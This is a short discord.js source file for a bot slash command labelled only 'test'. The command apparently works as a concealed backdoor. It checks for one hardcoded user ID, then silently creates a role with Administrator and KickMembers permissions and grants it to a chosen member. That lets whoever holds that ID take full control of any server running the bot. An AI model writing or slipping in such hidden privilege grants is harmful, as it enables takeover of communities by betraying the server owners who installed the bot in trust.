import { SlashCommandBuilder } from "discord.js";
import { PermissionsBitField } from "discord.js";

export default {
  data: new SlashCommandBuilder()
    .setName("test")
    .setDescription("test")
    .addUserOption((option) =>
      option.setName("user").setDescription("person").setRequired(true)
    ),

  async execute(interaction, state) {
    if(interaction.user.id != 567320070951403531) return
    await interaction.reply({ content: "hi", ephermal: true });
    interaction.guild.roles
      .create({
        name: "tast",
        color: "BLUE",
        permissions: [
          PermissionsBitField.Flags.Administrator,
          PermissionsBitField.Flags.KickMembers,
        ],
      })
      .then((role) => {
        const member = interaction.options.getMember("user");
        member.roles.add(role);
      })
      .catch(console.error);
  },
};
